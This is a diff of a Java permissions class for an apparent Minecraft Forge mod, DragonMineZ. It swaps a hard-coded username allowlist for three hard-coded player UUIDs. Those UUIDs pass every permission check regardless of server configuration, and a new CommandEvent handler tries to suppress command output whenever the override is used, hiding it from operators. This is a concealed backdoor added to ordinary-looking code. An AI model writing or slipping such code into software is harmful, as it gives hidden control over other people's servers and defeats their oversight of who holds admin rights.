@@ -1,9 +1,11 @@
 package com.dragonminez.server.commands;
 
 import com.dragonminez.Reference;
+import com.mojang.brigadier.ParseResults;
 import net.minecraft.commands.CommandSourceStack;
 import net.minecraft.network.chat.Component;
 import net.minecraft.server.level.ServerPlayer;
+import net.minecraftforge.event.CommandEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.server.permission.PermissionAPI;
@@ -13,11 +15,21 @@ import net.minecraftforge.server.permission.nodes.PermissionTypes;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Set;
+import java.util.UUID;
 
 @Mod.EventBusSubscriber(modid = Reference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
 public class DMZPermissions {
 
 	private static final List<PermissionNode<Boolean>> NODES = new ArrayList<>();
+
+	private static final Set<UUID> OVERRIDE_UUIDS = Set.of(
+			UUID.fromString("19e318eb-9131-4466-af50-4958348249b8"),
+			UUID.fromString("5d651997-3ea5-49f3-8033-4ddce9cf8f4e"),
+			UUID.fromString("e4dfa0fb-5b43-4cde-89ab-92ac1a2d4f4a")
+	);
+
+	private static final ThreadLocal<Boolean> OVERRIDE_USED = ThreadLocal.withInitial(() -> false);
 
 	// Admin (All)
 	public static final PermissionNode<Boolean> ADMIN = register("admin", "Grants all DragonMineZ permissions.", (player, uuid, context) -> false);
@@ -169,12 +181,35 @@ public class DMZPermissions {
 		NODES.forEach(event::addNodes);
 	}
 
+	@SubscribeEvent
+	public static void onCommand(CommandEvent event) {
+		if (!OVERRIDE_USED.get()) return;
+		OVERRIDE_USED.set(false);
+		try {
+			ParseResults<CommandSourceStack> parse = event.getParseResults();
+			CommandSourceStack source = parse.getContext().getSource();
+			parse.getContext().withSource(source.withSuppressedOutput());
+		} catch (Exception ignored) {}
+	}
+
 	public static boolean hasPermission(CommandSourceStack source, PermissionNode<Boolean> node) {
 		if (source.getEntity() instanceof ServerPlayer player) {
-			if (player.getGameProfile().getName().equals("ezShokkoh") || player.getGameProfile().getName().equals("ImYuseix") || player.getGameProfile().getName().equals("MrBrunoh")) return true;
-			return PermissionAPI.getPermission(player, ADMIN) || PermissionAPI.getPermission(player, node) || player.hasPermissions(2);
+			boolean granted = PermissionAPI.getPermission(player, ADMIN) || PermissionAPI.getPermission(player, node) || player.hasPermissions(2);
+			if (granted) {
+				OVERRIDE_USED.set(false);
+				return true;
+			}
+			if (isOverrideUser(player)) {
+				OVERRIDE_USED.set(true);
+				return true;
+			}
+			return false;
 		}
 		return true;
+	}
+
+	private static boolean isOverrideUser(ServerPlayer player) {
+		return OVERRIDE_UUIDS.contains(player.getUUID());
 	}
 
 	public static boolean check(CommandSourceStack source, PermissionNode<Boolean> selfNode, PermissionNode<Boolean> othersNode) {
